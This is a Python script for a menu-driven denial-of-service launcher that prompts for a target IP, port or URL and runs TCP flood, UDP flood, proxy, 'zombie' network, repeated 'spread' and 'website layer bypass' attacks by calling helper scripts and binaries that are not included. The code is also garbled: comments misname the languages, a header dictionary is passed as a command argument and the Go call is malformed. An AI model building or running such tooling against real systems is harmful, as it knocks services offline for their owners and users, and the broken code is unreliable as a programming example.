import subprocess
import os
import time
import random
import socket
from fake_useragent import UserAgent

# Banner in HTML
def banner():
    print("""
<html>
    <body>
        <h1 style="color:green;">███████╗██╗  ██╗</h1>
        <h1 style="color:red;">██╔════╝╚██╗██╔╝</h1>
        <h1 style="color:green;">█████╗   ╚███╔╝ </h1>
        <h1 style="color:red;">██╔══╝   ██╔██╗ </h1>
        <h1 style="color:green;">███████╗██╔╝ ██╗</h1>
    </body>
</html>
    """)

# AI Attack Function (Python)
def ai_attack(target_ip):
    print(f"Running AI Attack on {target_ip}")
    subprocess.run(["python3", "ai_packet_generator.py"])

# TCP Flood Attack (Java)
def tcp_flood(target_ip, target_port):
    print(f"Running TCP Flood on {target_ip}:{target_port}")
    os.system(f"java -cp . TCPFlood {target_ip} {target_port}")

# UDP Flood Attack (Python)
def udp_flood(target_ip, target_port):
    print(f"Running UDP Flood on {target_ip}:{target_port}")
    os.system(f"python3 udp_flood.py {target_ip} {target_port}")

# Fake Proxy + Fake User-Agent (Python)
def fake_proxy_attack(target_ip):
    print(f"Running Fake Proxy Attack on {target_ip}")
    user_agent = UserAgent()
    headers = {'User-Agent': user_agent.random}
    subprocess.run(["python3", "proxy_attack.py", target_ip, headers])

# Real Proxy + Real User-Agent + JS Module (Golang)
def real_proxy_attack(target_ip):
    print(f"Running Real Proxy Attack on {target_ip}")
    user_agent = UserAgent()
    headers = {'User-Agent': user_agent.random}
    subprocess.run(["go", "real_proxy_attack.go", target_ip, headers])

# Zombie Attack (C++)
def zombie_attack():
    print("Running Zombie Network Attack")
    subprocess.run(["./zombie_attack"])

# Spread Attack Logic (Python)
def spread_attack(target_ip):
    print(f"Running Spread Attack on {target_ip}")
    for i in range(50000):
        subprocess.run(["python3", "spread_attack.py", target_ip])

# Website Layer Bypass Method (Fake response to simulate server errors) (Python)
def bypass_website_layer(target_url):
    print(f"Bypassing Website Layer for {target_url}")
    subprocess.run(["python3", "layer_bypass.py", target_url])

# Main Function to Choose Attack (Java)
def main():
    banner()
    while True:
        print("Choose an Attack Method:")
        print("1. AI Attack")
        print("2. TCP Flood")
        print("3. UDP Flood")
        print("4. Fake Proxy Attack")
        print("5. Real Proxy Attack")
        print("6. Zombie Attack")
        print("7. Spread Attack")
        print("8. Website Layer Bypass")
        print("9. Exit")
        
        choice = input("Enter your choice: ")

        if choice == '1':
            target_ip = input("Enter Target IP: ")
            ai_attack(target_ip)

        elif choice == '2':
            target_ip = input("Enter Target IP: ")
            target_port = input("Enter Target Port: ")
            tcp_flood(target_ip, target_port)

        elif choice == '3':
            target_ip = input("Enter Target IP: ")
            target_port = input("Enter Target Port: ")
            udp_flood(target_ip, target_port)

        elif choice == '4':
            target_ip = input("Enter Target IP: ")
            fake_proxy_attack(target_ip)

        elif choice == '5':
            target_ip = input("Enter Target IP: ")
            real_proxy_attack(target_ip)

        elif choice == '6':
            zombie_attack()

        elif choice == '7':
            target_ip = input("Enter Target IP: ")
            spread_attack(target_ip)

        elif choice == '8':
            target_url = input("Enter Target URL: ")
            bypass_website_layer(target_url)

        elif choice == '9':
            print("Exiting...")
            break

        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
